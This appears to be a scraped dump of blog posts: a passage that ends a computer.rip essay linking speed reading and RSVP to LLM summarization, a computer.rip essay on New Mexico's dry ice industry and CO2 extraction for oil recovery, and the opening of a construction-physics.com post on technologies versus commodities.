eliminate the whole eye movement part of reading entirely, instead using a computer to present one word at a time, each centered in the same location. In theory, the words can be presented faster and faster until the user is reading more quickly than the visual system allows. Well, that's\\na\\ntheory at least. It's inconsistent with later research suggesting that reading speed is limited by cognition rather than perception, but most of that wasn't yet known at the time. Even so, Potter doesn't seem to have viewed RSVP as a speed reading technique. She described it as a method for cognitive research, one that could enable new experiments and improve old results by controlling for the many variables involved in scanning a page of text.\\nThe idea of RSVP as a speed reading technique seems to have been popularized by software startup Spritz, who launched an RSVP speed reading application in 2014. Spritz seems to have spun it as \"text streaming,\" although I think that might have been a later branding innovation. The claims of Spritz are relatively modest, only 1,000 WPM in most cases and sometimes as low as 600 WPM. These are speeds achievable (even if only narrowly) without technical assistance for exceptionally fast readers. Even so, it doesn't really work out. Research on the RSVP method of speed reading finds that comprehension decreases with increasing speed. Amusingly, some experiments show that RSVP results in decreased comprehension even when run at the same speed the subject reads naturally. Psychologists tend to attribute that effect to the fact that RSVP prevents going back and rereading a sentence that you didn't fully understand\u2014a behavior that seems to be a natural and even required part of good reading, despite the fact that Evelyn Wood and virtually every speed reading theorist since has outlawed it.\\nThe fact that the RSVP concept is fundamentally at odds with blinking is probably the major cause of a reported increase in fatigue, as well, but none of these shortcomings have prevented the massive popularity of RSVP within the tech industry especially. Spritz, the company, has gone basically nowhere, but the concept has graduated from TED talks to a huge inventory of browser extensions, mobile apps, CLI tools, and various and sundry GitHub projects that all make the same claims about increased reading speed. \"Speed Reading Makes a Comeback\" was the title of an NBC News spot on Iris Reading, more of a traditional Wood-style speed reading training company that has since wholeheartedly embraced the RSVP concept.\\nIf software is part of the speed reading story, and a particularly core part of it today, we will have to take on the elephant in the room: in a certain sense, a very real sense, summarizing text is now the largest single driver of the US economy.\\nThe appeal of summarization to the business executive has never gone away; the underlying technology has just evolved. Since the 2022 launch of ChatGPT, television spots, bus shelter ads, and the collective buzz of the south end of the San Francisco Peninsula have promised first and foremost that AI will relieve us of the obligation of reading. An LLM can read your email, read the news, read a book, or read the comments. Actually, the LLM has\\nalready\\nread a lot of these things. On command, it can summarize them to you.\\nAI advertising seems to imagine a world that is, well, oddly familiar: one in which students, housewives, and, yes, business executives can save hours of each day by using the LLM to, in effect, read at 25,000 WPM. It also seems that the same basic principles apply: the LLM's output loses some of the content of the original material. It might also gain some content, a benefit of all of the other things that the LLM has also been trained on. Still: there's always a certain rounding out, a sanding down of the details.\\nWhat strikes me most about LLM summaries is just how\\nlong\\nthey are. When I have asked Claude to summarize reading notes, it has routinely produced output that is\\nlonger than the original notes.\\nThis problem can probably be addressed by prompting, although my efforts at appending everything from \"be brief\" to \"for the love of God keep it to one paragraph\" have failed to produce a good result. Maybe I'm holding it wrong, maybe I'm an idiot, I possess no qualifications in this area besides decades as a natural language user and an unfinished degree in technical writing. But experience suggests that my coworkers have the same problem. I see AI generated meeting summaries, AI generated issue descriptions, AI generated sales documents. One of their common properties is that they are astoundingly, uselessly verbose.\\nOf course, modern AI can do so much more than summarize text. \"Generative AI\" promises not only to summarize, but also to create something new. Perhaps that's why the LLM is so verbose. I, personally, find that I make up for my lackluster interpersonal skills by writing. Perhaps LLMs make up for their similar limitations, their fundamentally text-based, screen-resident nature, by using the one tool that they have. The LLM cannot think or feel, yet it can write. So it writes: a simple question answered with such energy that it merits four distinct bulleted lists, each with an emoji-laden heading and an introductory paragraph. I suppose I can sympathize. We must imagine Grok happy.\\nI put a lot of time into writing this, and I hope that you enjoy reading it. If you can spare a few dollars, consider\\nsupporting me on ko-fi\\n. You'll receive an occasional extra, subscribers-only post, and defray the costs of providing artisanal, hand-built world wide web directly from Albuquerque, New Mexico.\\nI do not mean to criticize AI\\ntoo\\nharshly, although I think the level of criticism that this entire industry phenomena deserves is high enough that you have to go big.\\nBut the relationship between speed reading and the LLM\u2014between Sam Altman and Evelyn Wood\u2014is vague but vivid. The software industry's imagined future, in which people use LLMs to generate text that other people use LLMs to summarize, genuinely haunts me. AI has created a profound contradiction: it promises the productivity gains of speed reading, the ease of CliffsNotes, but it doesn't just shorten text. It also\\nlengthens\\nit. My joking reference to Camus, shoddy as it is, becomes more meaningful. ChatGPT pushes the written word up the hill, it watches it roll back down again.\\nI read \"The Myth of Sisyphus\" for the same reason everyone else did: high school. IB English HL. Yes, I went to one of those schools. If you are not familiar you can look it up and one of the top results, at least for me, is a clearly LLM-generated article that is four or five times longer than it should be based on the factual content. You can have your web browser's LLM feature summarize it back down for you, if you want. The result comes out a lot less useful than the Wikipedia article but it is, as they say, disruptive nonetheless.\\nIf the purpose of reading is solely to acquire information and accumulate thought units, then surely speed and efficiency are the essential criteria. Regressing is obviously a morbid symptom since it is destructive of time and energy, while horizontal reading not only taxes the optic muscles, but requires that the same tome remain clutched by fingers which could be more profitably employed in reaching for yet another volume.\\nWe're all full of opinions on the era of AI. I am perhaps not as pessimistic as you might think: the machine learning innovations of the last few years clearly do have useful applications. Even summarizing text has its time and place. I suppose that what frustrates me most about it all is the lack of ambition. LLMs train on text, take text as input, and generate text as output. A room of Silicon Valley visionaries, presented with this astounding tool, came up with such world-changing applications as \"reading emails\" and \"writing emails.\" The whole industry is still struggling to move past this trivial, boring, frequently nonproductive use.\\nAs for lip motions, any toddler knows that the mouth is tardier than the eye, and retardation is one of the most dreaded words in an educator's terminology. Furthermore, the speed cult is quick to point out that slow readers are rarely careful ones, and generally speaking, comprehension appears to increase with reading velocity. Speed reading, it would appear, is all profit and no loss and if it can make good its claims at linking efficiency and comprehension, then it is well that its methodology and objectives are incorporated into any reading program.\\nThere is the potential, the AI's industries advocates say, of AI actually expanding human creativity. Machine learning methods of producing \"art,\" whether text or image or audio or video, will lower the barrier of entry to artistic production. Of course, that depends a lot on how you define \"artistic production,\" but at least it's a rare promise of a better future rather than a worse one. It only takes a brief interaction with the modern internet to realize that we do live in an age blessed with text. We are rich in the written word like never before, so wealthy with words that they crowd out the actual information. Search results are mostly AI-generated, but the search engine doesn't want you to look at them anyway, it's provided its own AI-generated treatise. The headings, the paragraphs, the bulleted lists, they run down the page, drip from our screens, they leave our desks filthy with content.\\nBut prior to debating the plausibility of the claims in an Evelyn Wood brochure, it would seem logical to consider the desirability of the goals\u2014goals which appear to have slipped unchallenged into the realm of pedagogical axioms. Are such facile reading practices worthy of unqualified adulation? A careful look at their implications suggests that such seeming saints can in fact be devils.\\nIt's enough to drive you to madness. Why do we use computers to write text that no one will read? Why do we use computers to read text that no one wrote?\\nYears ago, in college, during a previous AI winter, I sat in my room reading a shitty science fiction novel. Leo, from across the hall, walked in. \"What class is that for?\" he asked.\\n\"Not for a class,\" I responded.\\n\"So you're just reading it?\"\\nTaken by themselves, the cardinal virtues of reading efficiency can collectively demean the entire reading process by treating it as a function rather than as an art.\\nThere is nothing new under the sun. We have done this all before: we have fixated on reading as production, production as profitable, and reading thus, ultimately, unimportant. A detail to be optimized away. An expense. ChatGPT didn't start this. It won't end it. That's what I remind myself: we are living through just another step in the evolution of culture.\\nBut then I still worry. What if this is it? Between short-form video and AI, between social media's pivot to stoking fascism and the publishing industry's pivot to reprinting AO3, what if language arts are done?\\nNone of these people care. That's the one thing I can say confidently, or at least say that I truly believe. These people building the cutting edge of natural language, these industry titans who style themselves as the loyalists of our nation and revolutionaries of the arts, they don't give a damn about writing or reading. Text is an asset, an asset to extract, refine, and dispense. They're just trying to make it through the news and their Twitter feeds and a half dozen pop-science books as fast as possible so that they can be, feel, or at least look like they're well-read. They assume that everyone else feels the same way.\\nHow can any teacher extol the pleasures of reading when classroom practice implicitly asserts that books are mines to be stripped and not pastures in which to dwell and delight?\\nI've been quoting from Leonard R. Mendelsohn, whose paper \"Jetting to Utopia: The Speed Reading Phenomenon\" ignores the question of whether or not speed reading works and instead considers whether or not it is a good idea. His context was the classroom of the 1970s: speed reading had caught on in education, and Mendelsohn worried. Well-intentioned teachers were training their students to absolutely optimize the mechanics of reading. In the process, Mendelsohn feared, they had forgotten the point.\\nReading can provide fodder for the brain by the ready conversion of wood pulp and printer's ink into social poise, persuasiveness, and a financially rewarding livelihood.\\nThings have changed a great deal since Mendelsohn's day. The wood pulp is gone, so too the printer ink, and so too the financial rewards. Writing is, I suppose, more of an art than ever before, as my chosen industry devotes its full might to destroying my chosen avocation.\\nAlthough reading might be branded with the explicit label \"fun,\" it is not long before the apt student reaches the conclusion that speed, concepts, and information are all one knows and all one needs to know.\\nMendelsohn's paper ran in the journal \"Language Arts.\" It's about four pages long, about 2,300 words. It took me around ten minutes to read. An accomplished student of Evelyn Wood could read it in just a couple of minutes. With some chiding to stay brief and cut it out with the bulleted lists, Claude summarized it in a few sentences.\\nFor the journal, though, the paper is not quite long enough. Its last page is only half full. The journal editor made up the difference, they found some filler. It's a poem about clouds.\\nChatGPT can do so much, but it can't do the work of a poet. It can't match Christa Kessler, age 10, Powhatan School, Boyce, Virginia. She wrote \"Clouds\" almost fifty years ago, an editor used it to round out the layout of a journal, JSTOR coughed it up along with my article, and now I am thinking about how clouds really\\nare\\ninterludes in the middle of a great blue sea.\\nThat's what it's like to read slow. That's what it means to write.\\nIf you don't immediately know the exact kind of YouTube video I'm talking about, maybe \"become a catgirl subliminal\" will jog your mind. Or just look it up and find out for yourself. Remember to stay hydrated.\\n\u21a9\\nOne of the hard things about writing about these kinds of fringe or parascientific topics is that they get all tangled up in each other and I have a hard time not getting lost on tangents. Fortunately I think that many of my readers have the same kind of internet exposure that I do and are probably familiar with the concept or claims made about binaural beats. You might be less aware that the whole thing dates back to the 1970s and perennially pops up in any kind of self-help or \"neurogenics\" or whatever context, including many speed reading courses. To be fair, back in the 1970s the idea was new and full of potential. Now it is not; decades of scientific investigation have failed to produce clear evidence that binaural beats do anything.\\n\u21a9</p>"},{"location":"computer.rip/the%20essence%20of%20frigidity_20260205/","title":"the essence of frigidity\\n\\n\u6765\u6e90: https://computer.rip\\n\u94fe\u63a5: https://computer.rip/2026-01-25-the-essence-of-frigidity.html\\n\u65e5\u671f: 25 Jan 2026 00:00:00 UT\\n\\n---\\n\\nThe front of the American grocery store contains a strange, liminal space: the","text":"<p>transitional area between parking lot and checkstand, along the front exterior and interior of the building, that fills with oddball commodities. Ice is a fixture at nearly every store, filtered water at most, firewood at some. This retail purgatory, both too early and too late in the shopping journey for impulse purchases, is mostly good only for items people know they will need as they check out. One of the standard residents of this space has always struck me as peculiar: dry ice.\\nCarbon dioxide ice is said to have been invented, or we might better say discovered, in the 1830s. For whatever reason, it took just about a hundred years for the substance to be commercialized. Thomas B. Slate was a son of Oregon, somehow ended up in Boston, and then realized that the solid form of CO2 was both fairly easy to produce and useful as a form of refrigeration. With an eye towards marketing, he coined the name Dry Ice\u2014and founded the DryIce Corporation of America. The year was 1925, and word quickly spread. In a widely syndicated 1930 article, \"Use of Carbon Dioxide as Ice Said to be Developing Rapidly,\" the\\nAlamogordo Daily News\\nand others reported that \"the development of... 'concentrated essence of frigidity' for use as a refrigerant in transportation of perishable products, is already taxing the manufacturing facilities of the Nation... So rapidly has the use of this new form of refrigeration come into acceptance that there is not sufficient carbon dioxide gas available.\"\\nThe rush to dry ice seems strange today, but we must consider the refrigeration technology of the time. Refrigerated transportation first emerged in the US during the middle of the 19th century. Train boxcars, packed thoroughly with ice, carried meat and fruit from midwestern agriculture to major cities. This type of refrigerated transportation greatly expanded the availability of perishables, and the ability to ship fruits and vegetables between growing regions made it possible, for the first time, to get some fresh fruit out of season. Still, it was an expensive proposition: railroads built extensive infrastructure to support the movement of trains loaded down with hundreds of tons of ice. The itself had to be quarried from frozen lakes, some of them purpose-built, a whole secondary seasonal transportation economy.\\nMechanical refrigeration, using some kind of phase change process as we are familiar with today, came about a few decades later and found regular use on steamships by 1900. Still, this refrigeration equipment was big and awkward; steam power was a practical requirement. As the Second World War broke out, tens of thousands of refrigerated railcars and nearly 20,000 refrigerated trucks were in service\u2014the vast majority still cooled by ice, not mechanical refrigeration.\\nYou can see, then, the advantages of a \"dryer\" and lighter form of ice. The sheer weight of the ice significantly reduced the capacity of refrigerated transports. \"One pound of carbon dioxide ice at 110 degrees below zero is declared to be equivalent to 16 pounds of water ice,\" the papers explained, for the purposes of transportation. The use of dry ice could reduce long-haul shipping costs for fruit and vegetables by 50%, the Department of Commerce estimated, and dry ice even opened the door to shipping fresh produce from the West Coast to the East\u2014without having to \"re-ice\" the train multiple times along the way. Indeed, improvements in refrigeration would remake the American agricultural landscape. Central California was being irrigated so that produce could grow, and refrigeration would bring that produce to market.\\n1916 saw the American Production Company drilling on the dusty plains of northeastern New Mexico, a few miles south of the town of Bueyeros. On the banks of an anonymous wash, in the shadow of Mesa Quitaras, they hoped to strike oil. Instead, at about 2,000 feet, they struck something else: carbon dioxide. The well blew wide open, and spewed CO2 into the air for about a year, the production estimated at 25,000,000 cubic feet of gas per day under natural pressure. For American Production, this was an unhappy accident. They could identify no market for CO2, and a year later, they brought the well under control, only to plug and abandon it permanently.\\nThough the \"No. 1 Bueyeros\" well was a commercial failure at the time, it was not wasted effort. American Production had set the future for northeastern New Mexico. There was oil, if you looked in the right place. American Production found its own productive wells, and soon had neighbors. Whiting Brothers, once operator of charismatic service stations throughout the Southwest and famously along Route 66, had drilled their own wells by 1928. American Production became part of British Petroleum. Breitburn Production of Texas has now consolidated much of the rest of the field, and more than two million cubic feet of natural gas come from northeastern New Mexico each month.\\nIf you looked elsewhere, there was gas\u2014not natural gas, but CO2. Most wells in the region produced CO2 as a byproduct, and the less fortunate attempts yielded nothing but CO2. The clear, non-flammable gas was mostly a nuisance in the 1910s and 1920s. By the 1930s, though, promotion by the DryIce Corporation of America (in no small part through the Bureau of Commerce) had worked. CO2 started to be seen as a valuable commodity.\\nThe production of dry ice is deceptively simple. Given my general knowledge about producing and handling cryogenic gases, I was surprised to read of commercial-scale production with small plants in the 1930s. There is, it turns out, not that much to it. One of the chief advantages of CO2 as an industrial gas is its low critical temperature and pressure. If you take yourself back to high school chemistry, and picture a phase diagram, we can think about liquifying the CO2 gas coming out of a well. The triple point of carbon dioxide, where increasing pressure and temperature will make it a liquid, is at around -60 Celsius and 5 atmospheres. The critical point, beyond which CO2 becomes a supercritical gas-fluid hybrid, is only at 30 degrees Celsius and 72 atmospheres. In terms more familiar to us Americans, that's about 88 degrees F and 1,000 PSI.\\nIn other words, CO2 gas becomes a liquid at temperatures and pressures that were readily achievable, even with the early stages of chemical engineering in the 1930s. With steam-powered chillers and compressors, it wasn't difficult to produce liquid CO2 in bulk. But CO2 makes the next step even more convenient: liquid CO2, released into open air, boils very rapidly. As it bubbles away, the phase change absorbs energy, leaving the remaining liquid CO2 even colder. Some of it freezes into ice, almost like evaporating seawater to extract the salt, evaporating liquid CO2 leaves a snow-like mass of flaky, loose CO2 ice. Scoop that snow up, pack it into forms, and use steam power or weight to compress it, and you have a block of the product we call dry ice.\\nThe Bueyeros Field, as it was initially known, caught the interest of CO2 entrepreneurs in 1931. A company called Timmons Carbonic, or perhaps Southern Dry Ice Company (I suspect these to be two names for the same outfit), produced a well about a mile east, up on the mesa.\\nOver the next few years, the Estancia Valley Carbon Dioxide Development Company drilled a series of wells to be operated by Witt Ice and Gas. These were located in the Estancia field, further southwest and closer to Albuquerque.  Witt built New Mexico's first production dry ice plant, which operated from 1932 to 1942 off of a pipeline from several nearby wells. Low pressure and difficult drilling conditions in the Estancia field limited the plant's output, so by the time it shut down Witt had already built a replacement. This facility, known as the Bueyeros plant, produced 17 tons of dry ice per day starting in 1940. It is located just a couple of miles from the original American Production well, north of Mesa Quitaras.\\nAbout 2,000' below the surface at Bueyeros lies the Tubb Sandstone, a loose aggregation of rock stuck below the impermeable Cimarron Anhydrite. Carbon dioxide can form underground through several processes, including the breakdown of organic materials under great heat and pressure (a process that creates petroleum oil as well) and chemical reactions between different minerals, especially when volcanic activity causes rapid mixing with plenty of heat. There are enough mechanisms of formation, either known or postulated, that it's hard to say where exactly the CO2 came from. Whatever its source, the gas flowed upwards underground into the sandstone, where it became trapped under the airtight layer of Anhydrite. It's still there today, at least most of it, and what stands out in particular about northeastern New Mexico's CO2 is its purity. Most wells in the Bueyeros field produce 99% pure CO2, suitable for immediate use.\\nNear Solano, perhaps 20 miles southwest of Bueyeros by air, the Carbonic Chemical Co built the state's largest dry ice plant. Starting operation in 1942, the plant seems to have initially gone by the name \"Dioxice,\" immortalized as a stop on the nearby Union Pacific branch. Dioxice is an occasional synonym for Dry Ice, perhaps intended to avoid the DryIce Corporation's trademark, although few bothered. The Carbonic Chemical Plant relied on an 18 mile pipeline to bring gas from the Bueyeros field. Uniquely, this new plant used a \"high pressure process.\" By feeding the plant only with wells producing high pressure (hundreds of PSI, as much as 500 PSI of natural pressure at some wells), the pipeline was made more efficient and reliable. Further, the already high pressure of the gas appreciably raised the temperature at which it would liquefy.\\nThe Carbonic Chemical plant's ammonia chillers only had to cool the CO2 to -15 degrees F, liquifying it before spraying it into \"snow chambers\" that filled with white carbon dioxide ice. A hydraulic press, built directly into the snow chamber, applied a couple of hundred tons of force to create a solid block of dry ice weighing some 180 pounds. After a few saw cuts, the blocks were wrapped in paper and loaded onto insulated train cars for delivery to customers throughout the west\u2014and even some in Chicago.\\nThe main applications of CO2, a 1959 New Mexico Bureau of Mines report explains, were dry ice for shipping. Secondarily, liquid CO2 was shipped in tanks for use in carbonating beverages. Witt Ice and Gas in particular built a good business out of distributing liquid CO2 for beverage and industrial use, and for a time was a joint venture with Chicago-based nationwide gas distributor Cardox. Bueyeros's gas producers found different customers over time, so it is hard to summarize their impact, but we know some salient examples. Most beverage carbonation in mid-century Denver, and perhaps all in Albuquerque, used Bueyeros gas. Dry ice from Bueyeros was used to pack train cars passing through from California, and accompanied them all the way to the major cities of the East Coast.\\nBy the 1950s, much of the product went to a more modern pursuit. Experimental work pursued by the military and the precursors to the Department of Energy often required precise control of low temperatures, and both solid and liquid CO2 were suitable for the purpose. In the late 1950s, Carbonic Chemical listed Los Alamos Scientific Laboratory, Sandia Laboratories, and White Sands Missile Range as their primary customers.\\nBueyeros lies in Harding County, New Mexico. Harding County is home to two incorporated cities (Roy and Mosquero), a couple of railroad stops, a few highways, and hardly 650 people. It is the least populous county of New Mexico, but it's almost the size of Delaware. Harding County has never exactly been a metropolis, but it did used to be a more vital place. In the 1930s, as the CO2 industry built out, there were almost 4,500 residents. Since then, the population has declined about 20% from each census to the next.\\nCO2 production went into a similar decline. After the war, significant improvements in refrigeration technology made mechanical refrigeration inevitable, even for road transportation. Besides, the growing chemical industry had designed many industrial processes that produced CO2 as a byproduct. CO2 for purposes like carbonation and gas blanketing was often available locally at lower prices than shipped-in well CO2, leading to a general decline in the CO2 industry.\\nGrowing understanding of New Mexico geology and a broader reorganizing of the stratigraphic nomenclature lead the Bueyeros Field to become part of the Bravo Dome. Bravo Dome CO2 production in the 1950s and 1960s was likely supported mostly by military and weapons activity, as by the end of the 1960s the situation once again looked much like it did in the 1910s: the Bravo Dome had a tremendous amount of gas to offer, but there were few applications. The rate of extraction was limited by the size of the market. Most of the dry ice plants closed, contributing, no doubt, to the depopulation of Harding County.\\nThe whole idea of drilling for CO2 is now rather amusing. Our modern problems are so much different: we have\\ntoo much\\nCO2, and we're producing even more without even intending to. It has at times seemed like the industry of the future will be putting CO2 down into the ground, not taking it out. What happened out in Harding County was almost the opening of Pandora's box. A hundred years ago, before there was a dry ice industry in the US, newspaper articles already speculated as to the possibility of global warming by CO2. At the time, it was often presented as a positive outcome: all the CO2 released by burning coal would warm the environment and thus reduce the need for that coal, possibly even a self-balancing problem. It's even more ironic that CO2 was extracted mostly to make things colder, given the longer-term consequences. Given all that, you would be forgiven for assuming that drilling for CO2 was a thing of the past.\\nThe CO2 extraction industry has always been linked to the oil industry, and oil has always been boom and bust. In 1982, there were 16 CO2 wells operating in the Bravo Dome field. At the end of 1985, just three years later, there were 258. Despite the almost total collapse of demand for CO2 refrigeration, demand for liquid CO2 was up by far. It turns out that American Production hadn't screwed up in 1917, at least not if they had known a little more about petroleum engineering.\\nIn 1972, the Scurry Area Canyon Reef Operators Committee of West Texas started an experiment, attempting industrial application of a technique first proposed in the 1950s. Through a network of non-productive oil wells in the Permian Basin, they injected liquid CO2 deep underground. The rapidly evaporating liquid raised the pressure in the overall oil formation, and even lubricated and somewhat fractured the rock, all of which increased the flow rate at nearby oil wells. A decade later, the concept was proven, and CO2 Enhanced Oil Recovery (EOR) swept across the Permian Basin.\\nToday, it is estimated that about 62% of the global industrial production of CO2 is injected into the ground somewhere in North America to stimulate oil production. The original SACROC system is still running, now up to 414 injection wells. There are thousands more. Every day, over two billion cubic feet of CO2 are forced into the ground, pushing back up 245,000 barrels of additional oil.\\nBritish Petroleum's acquisition of American Production proved fortuitous. BP became one of the country's largest producers of CO2, extracted from the ground around Bueyeros and transported by pipeline directly to the Permian Basin for injection. In 2000, BP sold their Bravo Dome operations to Occidental Petroleum\\n1\\n. Now going by Oxy, the petroleum giant has adopted a slogan of \"Zero In\". That's zero as in carbon emissions.\\nI would not have expected to describe Occidental Petroleum as \"woke,\" but in our contemporary politics they stand out. Oxy mentions \"Diversity, Inclusion, and Belonging\" on the front page of their website, which was once attractive to investors but now seems more attractive to our nation's increasingly vindictive federal government. Still, Oxy is sticking to a corporate strategy that involves acknowledging climate change as real, which I suppose counts as refreshing. From a 2025 annual report:\\nOxy is building an integrated portfolio of low-carbon projects, products, technologies and companies that complement our existing businesses; leveraging our competitive advantages in CO2 EOR, reservoir management, drilling, essential chemicals and major infrastructure projects; and are designed to sustain long term shareholder value as we work to implement our Net-Zero Strategy.\\nYes, Oxy has made achieving net-zero carbon a major part of their brand, and yes, this model of reducing carbon emissions relies heavily on CO2 EOR: the extraction of CO2 from the ground.\\nIn a faltering effort to address carbon emissions, the United States has leaned heavily on the promise of Carbon Capture and Storage (CCS) technologies. The idea is to take CO2 out of the environment (potentially by separating it from the air but, more practically, by capturing it in places where it is already concentrated by industrial processes) and to put it somewhere else. Yes, this has shades of the Australian television sketch about the ship whose front fell off, but the key to \"sequestration\" is time. If we can put enough carbon somewhere that it will say for enough time, we can reduce the \"active\" greenhouse gas content of our environment. The main way we have found of doing this is injecting it deep underground. How convenient, then, that the oil industry is already looking for CO2 for EOR.\\nCCS has struggled in many ways, chief among them that the majority of planned CCS projects have never been built. As with most of our modern carbon reduction economy, even the CCS that has been built is, well, a little bit questionable. There is something of a Faustian bargain with fossil fuels. As we speak, about 45 megatons of CO2 are captured from industrial processes each year for CCS. Of that 45 Mt, 9 Mt are injected into dedicated CO2 sequestration projects. The rest, 80%, is purchased by the oil industry for use in EOR.\\nThis form of CCS, in which the captured CO2 is applied to an industrial process that leads to the production of more CO2, has taken to the name CCUS. That's Carbon Capture,\\nUtilization,\\nand Storage. Since the majority of the CO2 injected for EOR never comes back up, it is a form of sequestration. Although the additional oil produced will generally be burned, producing CO2, the process can be said to be\\ninefficient in terms of CO2\\n. In other words, the CO2 produced by burning oil from EOR is less in volume than the CO2 injected to stimulate recovery of that oil.\\nI put a lot of time into writing this, and I hope that you enjoy reading it. If you can spare a few dollars, consider\\nsupporting me on ko-fi\\n. You'll receive an occasional extra, subscribers-only post, and defray the costs of providing artisanal, hand-built world wide web directly from Albuquerque, New Mexico.\\nMathematically, CCUS, the use of CO2 to produce oil, leads to a net reduction in released CO2. Philosophically, though, it is deeply unsatisfying. This is made all the worse by the fact that CCUS has benefited from significant government support. Outright subsidies for CCS are uncommon, although they do exist. What\\nare\\nquite common are grants and subsidized financing for the capital costs of CCS facilities. Nearly all CCS in the US has been built with some degree of government funding, totaling at least four billion dollars, and regulatory requirements for CCS to offset new fossil fuel plants may create a de facto electrical ratepayer subsidy for CCS. Most of that financial support, intended for our low-carbon future, goes to the oil producers.\\nThe Permian Basin is well-positioned for CCS EOR because it produces mostly natural gas. Natural gas in its raw form, \"well gas,\" almost always includes CO2. Natural gas processing plants separate the combustible gases from noncombustible ones, producing natural gas that has a higher energy content and burns more cleanly\u2014but, in the process, venting large quantities of CO2 into the atmosphere. Oxy is equipping its Permian Basin natural gas plants with a capture system that collects the CO2 and compresses it for use in EOR.\\nThe problem is that CO2 consumption for EOR has, as always, outpaced production. There aren't enough carbon capture systems to supply the Permian Basin fields, so \"sequestered\" CO2 is mixed with \"new\" CO2. Bravo Dome CO2 production has slowly declined since the 1990s, due mostly to declining oil prices. Even so, northeastern New Mexico is still full of Oxy wells bringing up CO2 by the millions of cubic feet. 218 miles of pipeline deliver Bueyeros CO2 into West Texas, and 120 miles of pipeline the other way land it in the oil fields of Wyoming. There is very nearly one producing CO2 well per person in Harding County.\\nConsidering the totality of the system, it appears that government grants, financing incentives, and tax credits for CCS are subsidizing not only natural gas production but the extraction of CO2 itself. Whether this is progress on climate change or a complete farce depends a mathematical analysis. CO2 goes in, from several different sources; CO2 goes out, to several different dispositions. Do we remove more from the atmosphere than we end up putting back? There isn't an obvious answer.\\nThe oil industry maintains that CCS is one of the most practical means of reducing carbon emissions, with more CO2 injected than produced and a resulting reduction in the \"net CO2 impact\" of the product natural gas.\\nAs for more independent researchers, well, a paper finding that CCS EOR \"cannot contribute to reductions\" isn't the worst news. A 2020 literature review of reports on CCS EOR projects found that they routinely fail to account for significant secondary carbon emissions and that, due to a mix of the construction and operational realities of CCS EOR facilities and the economics of oil consumption, CCS EOR has so far produced a modest net\\nincrease\\nin greenhouse gas emissions.\\nThey're still out there today, drilling for carbon dioxide. The reports from the petroleum institute today say that the Permian Basin might need even more shipped in. New Mexico is an oil state; Texas gets the reputation but New Mexico has the numbers. Per-capita oil production here is significantly higher than Texas and second only to North Dakota. New Mexico now produces more oil than Old Mexico, if you will, the country to our south.\\nPer capita, New Mexico ranks 12th for CO2 emissions, responsible for about 1% of the nation's total. Well, I can do a bit better: for CO2 intentionally extracted from the ground, New Mexico is #3, behind only Colorado and Mississippi for total production. We produce something around 17% of the nation's supply of extracted CO2, and we even use most of it locally. I guess that's something you could put a good spin on.\\nBy this time, Armand Hammer was no longer CEO of Occidental, which is unfortunate since it deprives me of an excuse to talk at length about how utterly bizarre Armand Hammer was, and about the United World College he founded in Las Vegas, NM. Suffice it to say, for now, that Occidental had multiple connections to New Mexico.\\n\u21a9</p>"},{"location":"construction-physics.com/","title":"construction-physics.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>On Technologies vs. Commodities 20260129</li> <li>Reading List for 01-31-2026 20260131</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"construction-physics.com/On%20Technologies%20vs.%20Commodities_20260129/","title":"On Technologies vs. Commodities","text":"<p>\u6765\u6e90: construction-physics.com \u53d1\u5e03\u65f6\u95f4: Thu, 29 Jan 2026 13:00:33 GMT \u94fe\u63a5: https://www.construction-physics.com/p/on-technologies-vs-commodities</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://www.construction-physics.com/feed', 'value': '<p>A theory that has gained traction in the renewable energy space is that renewable energy sources like wind and solar are based on manufactured \u201ctechnologies\u201d, while fossil fuel energy sources like oil, coal, and natural gas are based on extracted \u201ccommodities\u201d. Per this theory, technologies can take advantage of learning curves, and thus will continue to get cheaper as they\u2019re deployed in larger and larger volumes; commodities, on the other hand, don\u2019t have learning curves, and thus can\u2019t be expected to get cheaper over time.</p><p>Here, for instance, is a report from the Rocky Mountain Institute advancing this theory:</p><p>There are two main perspectives on the energy transition: the old incumbent view of business-as-usual; and the new insurgent view of exponential change. At heart this is the longstanding battle of commodities versus technologies. Design and technologies beat commodities because they enjoy learning curves and are limitless. So costs fall over time, and growth is exponential. New energy comes from manufactured, modular, scalable, clean technologies; old energy is from centralized, heavy, dirty commodities.</p><p>This theory obviously favors increasing the rollout of renewable energy; the more renewables we build, the cheaper our energy will get, whereas if we stick with fossil fuels we can\u2019t expect that to happen.</p><p>Folks referencing this theory seem to disagree as to the exact mechanisms that are driving the difference between price trends in technologies and commodities. The same Rocky Mountain Institute report suggests it\u2019s because commodities have depletion dynamics and because cartels like OPEC can control the price:</p><p>Individual fossil fuel technologies of course do have learning curves; but because of depletion and cartels, fossil fuel prices have not shown structural decline over time.</p><p>Someone else suggested to me that what this distinction is really getting at is elasticity of supply \u2014 that it\u2019s much more straightforward to scale up the production of technologies than it is for commodities.</p><p>This 2011 paper from McNerney et al. on the historical price of coal-fired electricity suggests the difference is more about commodities being easily tradable:</p><p>Coal prices have fluctuated and shown no overall trend up or down; they became the most important determinant of fuel costs when average thermal efficiencies ceased improving in the U.S. during the 1960s. This fluctuation and lack of trend are consistent with the fact that coal is a traded commodity, and therefore, it should not be possible to make easy arbitrage profits by trading it. According to standard results in the theory of finance, this implies that it should follow a random walk. In contrast, plant construction costs, the most important determinant of capital costs, followed a decreasing trajectory until 1970, consistent with what one expects from a technology.</p><p>(I don\u2019t think this makes a ton of sense \u2014 as we\u2019ll see, something being tradable doesn\u2019t preclude it from getting cheaper over time \u2014 but I wanted to flag it as a mechanism folks use to explain the difference between technologies and commodities.)</p><p>Regardless of the mechanisms, I think the \u201ctechnologies vs. commodities\u201d theory is, in practice, actually bundling a few different questions together:</p><ul><li><p>To what extent can technologies and commodities be expected to decline in price over time?</p></li><li><p>Relatedly,  to what extent are technologies and commodities subject to different dynamics that will affect their price?</p></li><li><p>And finally, do commodities exhibit learning curves \u2014 that is, does their price decline as a function of cumulative production volume?</p></li></ul><p>Let\u2019s look at each one of these questions and try to answer them.</p>Do commodities get cheaper over time?<p>I think the idea that technologies (and more generally, manufactured goods) tend to exhibit declining prices over time is pretty clearly true. When Nagy et al. 2013 used the performance curve database to analyze cost trends for 62 different technologies, they found that Moore\u2019s Law (prices decreasing exponentially with time) was nearly as good as Wright\u2019s Law (prices decreasing exponentially with 